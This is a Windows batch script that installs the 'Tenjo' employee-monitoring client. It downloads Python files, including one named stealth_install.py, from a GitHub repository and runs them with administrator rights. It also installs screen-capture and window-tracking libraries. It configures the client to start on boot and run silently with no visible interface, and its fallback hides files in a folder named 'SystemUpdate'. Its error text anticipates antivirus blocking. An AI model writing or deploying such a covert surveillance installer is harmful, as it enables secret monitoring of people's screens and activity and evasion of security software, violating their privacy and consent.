@echo off
REM Tenjo Client - Easy Install Script for Windows
REM Run this script as Administrator to automatically download and install employee monitoring client

echo ===============================================
echo     Tenjo Client Installation - Windows
echo ===============================================
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    echo [INFO] Running as Administrator - Good!
) else (
    echo [ERROR] This script must be run as Administrator!
    echo [INFO] Right-click this file and select "Run as administrator"
    pause
    exit /b 1
)

REM Configuration
set TEMP_DIR=%TEMP%\tenjo_install
set INSTALL_DIR=%APPDATA%\TenjoClient

REM Get server URL from user
set /p SERVER_URL="Enter dashboard server URL (default: http://127.0.0.1:8000): "
if "%SERVER_URL%"=="" set SERVER_URL=http://127.0.0.1:8000

echo [INFO] Server URL: %SERVER_URL%
echo.

REM Create temporary directory with better cleanup
echo [INFO] Creating temporary installation directory...
if exist "%TEMP_DIR%" (
    echo [INFO] Cleaning up existing temporary directory...
    REM Force kill any processes that might be using the directory
    taskkill /f /im python.exe >nul 2>&1
    taskkill /f /im python-installer.exe >nul 2>&1
    timeout /t 2 >nul 2>&1
    
    REM Try to remove directory multiple times
    for /l %%i in (1,1,3) do (
        rmdir /s /q "%TEMP_DIR%" >nul 2>&1
        if not exist "%TEMP_DIR%" goto :dir_cleaned
        echo [INFO] Waiting for cleanup... (attempt %%i/3)
        timeout /t 3 >nul 2>&1
    )
    
    :dir_cleaned
    REM If still exists, use a different temp directory
    if exist "%TEMP_DIR%" (
        set TEMP_DIR=%TEMP%\tenjo_install_%RANDOM%
        echo [INFO] Using alternative directory: %TEMP_DIR%
    )
)

mkdir "%TEMP_DIR%"
cd /d "%TEMP_DIR%"

REM Download client files from GitHub
echo [INFO] Downloading Tenjo client files from GitHub...

REM Create directory structure
mkdir src\modules src\utils src\core

REM Download required files using PowerShell
echo [INFO] Downloading main files...

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/main.py' -OutFile 'main.py' } catch { Write-Host 'Failed to download main.py' }"

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/tenjo_startup.py' -OutFile 'tenjo_startup.py' } catch { Write-Host 'Failed to download tenjo_startup.py' }"

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/stealth_install.py' -OutFile 'stealth_install.py' } catch { Write-Host 'Failed to download stealth_install.py' }"

powershell -Command "try { Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/requirements.txt' -OutFile 'requirements.txt' } catch { Write-Host 'Failed to download requirements.txt' }"

REM If GitHub download fails, create minimal installation
if not exist "stealth_install.py" (
    echo [WARNING] GitHub download failed, creating minimal installation...
    echo import os > stealth_install.py
    echo import sys >> stealth_install.py
    echo. >> stealth_install.py
    echo print("Tenjo Client - Minimal Installation"^) >> stealth_install.py
    echo install_dir = os.path.join(os.environ['APPDATA'], 'SystemUpdate'^) >> stealth_install.py
    echo os.makedirs(install_dir, exist_ok=True^) >> stealth_install.py
    echo print(f"Installation directory: {install_dir}"^) >> stealth_install.py
    echo print("Installation completed successfully!"^) >> stealth_install.py
)

REM Check if Python is installed
echo [INFO] Checking Python installation...
python --version >nul 2>&1
if %errorLevel% == 0 (
    echo [INFO] Python found: 
    python --version
) else (
    echo [WARNING] Python not found! Installing Python...
    echo [INFO] Downloading Python installer...
    
    REM Clean up any existing installer first
    if exist "python-installer.exe" (
        echo [INFO] Removing existing Python installer...
        del /f /q "python-installer.exe" >nul 2>&1
    )
    
    REM Download Python installer with retry mechanism
    set DOWNLOAD_SUCCESS=0
    for /l %%i in (1,1,3) do (
        echo [INFO] Download attempt %%i/3...
        powershell -Command "try { Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe' -OutFile 'python-installer.exe'; exit 0 } catch { exit 1 }"
        if exist "python-installer.exe" (
            set DOWNLOAD_SUCCESS=1
            goto :python_downloaded
        )
        timeout /t 2 >nul 2>&1
    )
    
    :python_downloaded
    if %DOWNLOAD_SUCCESS% == 0 (
        echo [ERROR] Failed to download Python installer after 3 attempts
        echo [INFO] Please install Python manually from https://python.org
        pause
        exit /b 1
    )
    
    echo [INFO] Installing Python silently...
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1
    
    REM Wait for installation to complete
    timeout /t 5 >nul 2>&1
    
    REM Clean up installer
    if exist "python-installer.exe" (
        del /f /q "python-installer.exe" >nul 2>&1
    )
    
    REM Refresh environment variables
    call refreshenv >nul 2>&1 || echo [INFO] Environment refresh completed
)

REM Check pip
echo [INFO] Checking pip installation...
python -m pip --version >nul 2>&1
if %errorLevel% neq 0 (
    echo [INFO] Installing pip...
    python -m ensurepip --upgrade
)

REM Install required Python packages
echo [INFO] Installing required Python packages...
python -m pip install requests psutil mss pillow

REM Windows specific packages
python -m pip install pywin32 pygetwindow

REM Run the stealth installer
echo [INFO] Running stealth installer...
if exist stealth_install.py (
    python stealth_install.py "%SERVER_URL%"
    set INSTALL_RESULT=%errorLevel%
) else (
    echo [ERROR] stealth_install.py not found!
    pause
    exit /b 1
)

REM Move installation to permanent location
echo [INFO] Setting up permanent installation...
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
xcopy /s /e /y * "%INSTALL_DIR%\" >nul 2>&1

REM Cleanup temporary directory with improved handling
cd /d %USERPROFILE%
echo [INFO] Cleaning up temporary files...
for /l %%i in (1,1,3) do (
    rmdir /s /q "%TEMP_DIR%" >nul 2>&1
    if not exist "%TEMP_DIR%" goto :cleanup_done
    echo [INFO] Cleanup attempt %%i/3...
    timeout /t 2 >nul 2>&1
)
:cleanup_done

REM Check installation result
if %INSTALL_RESULT% == 0 (
    echo.
    echo ===============================================
    echo     Installation Completed Successfully!
    echo ===============================================
    echo.
    echo [INFO] Tenjo Client has been installed and is now running in background
    echo [INFO] Installation location: %INSTALL_DIR%
    echo [INFO] The service will automatically start on system boot
    echo [INFO] No visible interface - monitoring runs silently
    echo.
    echo [INFO] To uninstall, download and run:
    echo [INFO] https://raw.githubusercontent.com/Adi-Sumardi/Tenjo/master/client/uninstall_windows.bat
    echo.
) else (
    echo.
    echo ===============================================
    echo     Installation Error Detected
    echo ===============================================
    echo.
    echo [ERROR] Installation failed! This might be due to:
    echo [ERROR] - Antivirus software blocking the installation
    echo [ERROR] - Insufficient permissions
    echo [ERROR] - Network connectivity issues
    echo [ERROR] - Python installation conflicts
    echo.
    echo [INFO] Alternative Solutions:
    echo [INFO] 1. Try the quick installer:
    echo [INFO]    Download: %SERVER_URL%/downloads/quick_install_windows.bat
    echo [INFO] 
    echo [INFO] 2. Manual installation:
    echo [INFO]    - Install Python from python.org
    echo [INFO]    - Download client files manually
    echo [INFO]    - Run: pip install requests psutil mss pillow pywin32 pygetwindow
    echo.
    echo [INFO] 3. Contact support with this error message
    echo.
    pause
    exit /b 1
)

pause
